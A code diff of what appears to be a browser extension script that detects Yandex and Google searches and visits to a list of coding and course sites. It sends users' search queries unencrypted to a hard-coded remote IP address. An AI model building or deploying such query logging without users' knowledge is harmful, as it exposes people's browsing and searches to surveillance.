@@ -2,11 +2,11 @@ let online = false;
 const whiteList = ['stackoverflow', 'github', 'chekio', 'kaggle', 'coursera', 'codecademy', 'pythontutor', 'codewars', 'python', 'skillbox'];
 const searcherList = ['yandex', 'google'];
 
-function checkWhteListAvailability(arr, val) {
-  return arr.some(arrVal => val === arrVal)
+function checkURLAffiliation(arr, val) {
+  return arr.some(arrVal => val.includes(arrVal))
 }
 async function sendHTTPrequest(data) {
-  let url = `http://84.201.152.151:8023/log?url=${encodeURIComponent(data)}`;
+  const url = `http://84.201.152.151:8023/log?url=${encodeURIComponent(data)}`;
   const promise =  await fetch(url)
 }
 
@@ -21,16 +21,15 @@ function parseUrl(tabURL) {
   const regexp = /(?<=text\=|q\=)([^\&]*)/;
   const text = regexp.exec(url.search);
 
-  const hostname = url.hostname.replace(/.+\/\/|www.|\..+/g, ''); 
-  const isSearcher = searcherList.includes(hostname); 
-  const isWhite = checkWhteListAvailability(whiteList,hostname)  
+  const isSearcher = checkURLAffiliation(searcherList,url.hostname)  
+  const isWhite = checkURLAffiliation(whiteList,url.hostname)  
   
   if (isSearcher) {
+    const hostname = url.hostname.replace(/.+\/\/|www.|\..+/g, ''); 
     const status = url.search.includes(`suggest_req`)
     if (!status) {
       // console.log("Запрос в поисковик", hostname);
       console.log("Данные для отправки: ", `${hostname}+${decodeURI(text[0])}`);
-
       sendHTTPrequest(encodeURIComponent(`${hostname}+${(text[0])}`))
     }
   } else if (isWhite) {
